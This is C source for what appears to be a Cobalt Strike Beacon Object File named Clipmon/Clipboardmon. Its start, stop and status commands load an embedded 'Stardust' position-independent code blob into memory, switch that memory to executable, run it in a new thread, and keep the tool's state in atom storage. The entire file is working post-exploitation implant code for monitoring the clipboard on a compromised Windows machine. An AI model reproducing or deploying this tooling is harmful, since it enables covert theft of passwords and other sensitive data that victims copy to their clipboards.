#include <windows.h>
#include "../beacon.h"
#include "stardust.h"
#include "common/struct.h"
#include "common/AtomStorage.h"

BOOL PatchAddr(unsigned char* buffer, int bufLen, void* newValue, char* needle, LPVOID* needleAddr)
{
    // Iterate over the buffer
    for (int i = 0; i < bufLen; i++)
    {
        // Compare the next 8 bytes in the buffer against the needle
        if (memcmp(buffer + i, needle, sizeof(PVOID)) == 0)
        {
            // If the newValue parameter was provided patch it in to replace needle
            if (newValue)
                memcpy(buffer + i, &newValue, sizeof(PVOID));

            // If the needleAddr parameter was provided store the address of needle
            if (needleAddr)
                *needleAddr = (LPVOID)(buffer + i);
            return TRUE;
        }
    }

    return FALSE;
}


VOID go(
    IN PCHAR Buffer,
    IN ULONG Length
)
{
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);

    // Extract mode
    char* pMode = BeaconDataExtract(&parser, NULL);

    // Start mode
    if (strcmp(pMode, "start") == 0)
    {
        // Check whether tool is already installed
        pSharedData pCheckAddr = GetMemAddr();
        if (pCheckAddr != NULL)
        {
            BeaconPrintf(CALLBACK_ERROR, "Clipmon is already running");
            return;
        }

        // Create struct to hold important values over tools lifetime
        pSharedData sd = (pSharedData)malloc(sizeof(SharedData));
        memset(sd, 0, sizeof(SharedData));

        // Store struct address
        SetMemAddr(sd);
        pCheckAddr = GetMemAddr();
        if (sd != pCheckAddr)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "Failed to store shared struct");
            memset(sd, 0, sizeof(SharedData));
            free(sd);
            SetMemAddr((pSharedData)0);
            return;
        }

        // Set BeaconPrintf address
        sd->pBeaconPrintf = &BeaconPrintf;

        // Create event to signal PIC thread to terminate
        sd->hEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
        if (!sd->hEvent)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "Failed to create thread termination event! %d", GetLastError());
            memset(sd, 0, sizeof(SharedData));
            free(sd);
            SetMemAddr((pSharedData)0);
            return;
        }

        // Allocate memory for the Stardust PIC
        sd->pStardust = VirtualAlloc(NULL, stardust_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!sd->pStardust)
        {
            BeaconPrintf(CALLBACK_OUTPUT, "VirtualAlloc failed! %d", GetLastError());
            memset(sd, 0, sizeof(SharedData));
            free(sd);
            SetMemAddr((pSharedData)0);
            return;
        }

        // Copy PIC into buffer
        memcpy(sd->pStardust, stardust, stardust_len);

        // Store length of Stardust PIC for later
        sd->stardust_len = stardust_len;

                // Toggle memory protections on PIC
        DWORD op;
        if (!VirtualProtect(sd->pStardust, stardust_len, PAGE_EXECUTE_READ, &op))
        {
            BeaconPrintf(CALLBACK_ERROR, "VirtualProtect failed! %d", GetLastError());
            memset(sd->pStardust, 0, stardust_len);
            VirtualFree(sd->pStardust, 0, MEM_RELEASE);
            memset(sd, 0, sizeof(SharedData));
            free(sd);
            SetMemAddr((pSharedData)0);
            return;
        }

        // Execute the PIC
        sd->hStardustThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sd->pStardust, NULL, 0, NULL);
        if (sd->hStardustThread == NULL)
        {
            BeaconPrintf(CALLBACK_ERROR, "CreateThread failed! %d", GetLastError());
            VirtualProtect(sd->pStardust, stardust_len, PAGE_READWRITE, &op);
            memset(sd->pStardust, 0, stardust_len);
            VirtualFree(sd->pStardust, 0, MEM_RELEASE);
            memset(sd, 0, sizeof(SharedData));
            free(sd);
            SetMemAddr((pSharedData)0);
            return;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "Clipboardmon started!");

        return;
    }
    // Stop mode
    else if (strcmp(pMode, "stop") == 0)
    {
        // Retrieve struct address
        pSharedData sd = GetMemAddr();
        if (sd == NULL)
        {
            BeaconPrintf(CALLBACK_ERROR, "Clipboardmon is not running!");
            return;
        }

        // Signal PIC to exit
        SetEvent(sd->hEvent);

        // Wait until thread exits
        if (WaitForSingleObject(sd->hStardustThread, 500) != WAIT_OBJECT_0)
            TerminateThread(sd->hStardustThread, 0);

        // Toggle protections and zero memory
        DWORD op;
        if (VirtualProtect(sd->pStardust, sd->stardust_len, PAGE_READWRITE, &op))
            memset(sd->pStardust, 0, sd->stardust_len);

        // Free memory
        VirtualFree(sd->pStardust, 0, MEM_RELEASE);

        // Zero and free struct
        memset(sd, 0, sizeof(SharedData));
        free(sd);

        // Delete atoms
        SetMemAddr((pSharedData)0);

        BeaconPrintf(CALLBACK_OUTPUT, "Clipboardmon stopped!");
    }
    else if (strcmp(pMode, "status") == 0)
    {
        pSharedData pCheckAddr = GetMemAddr();
        if (pCheckAddr)
            BeaconPrintf(CALLBACK_OUTPUT, "Clipboardmon is running.");
        else
            BeaconPrintf(CALLBACK_OUTPUT, "Clipboardmon is NOT running.");
    }
    else
        return;
};
